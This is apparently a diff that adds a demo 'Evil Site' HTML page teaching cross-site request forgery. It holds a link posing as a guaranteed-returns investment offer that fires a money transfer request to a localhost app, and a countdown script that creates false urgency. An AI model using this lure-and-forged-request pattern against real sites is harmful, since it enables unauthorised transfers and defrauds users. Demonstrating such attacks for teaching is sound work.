@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>😈 Evil Site</title>
+  </head>
+  <body>
+    <h1>😈 Evil Site</h1>
+
+    <!-- Cross Site Request Forgery (CSRF) -->
+    <a
+      style="text-decoration: none"
+      href="http://localhost:3000/transfer?to=daniel&amount=8888"
+      target="_blank"
+      >👉🏻 Guaranteed 10% monthy returns on your investment! Click here to secure
+      your slot now! 🏆</a
+    >
+    <p>
+      Time left for this exclusive offer: <span id="countdown"></span> seconds
+    </p>
+
+    <script>
+      function countDownTimer() {
+        let timeLeft = 60;
+
+        const countdownElement = document.getElementById("countdown");
+        countdownElement.innerText = timeLeft; // Set initial value
+
+        const timer = setInterval(() => {
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            countdownElement.innerText = "Time's up!";
+          } else {
+            timeLeft--;
+            countdownElement.innerText = timeLeft;
+          }
+        }, 1000);
+      }
+      countDownTimer();
+    </script>
+  </body>
+</html>
